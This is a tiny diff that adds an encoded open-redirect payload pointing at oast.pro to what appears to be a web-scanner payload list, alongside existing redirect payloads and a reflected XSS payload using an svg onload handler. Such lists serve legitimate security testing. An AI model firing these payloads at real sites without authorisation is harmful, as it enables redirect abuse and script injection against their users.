@@ -9,3 +9,4 @@
 /%5coast.pro/%2f%2e%2e
 /?meta=%3Csvg%2Fonload=confirm%28document.domain%29%3E
 ///interact.sh/%2F..
+/%2f%5c%2foast.pro%2f..
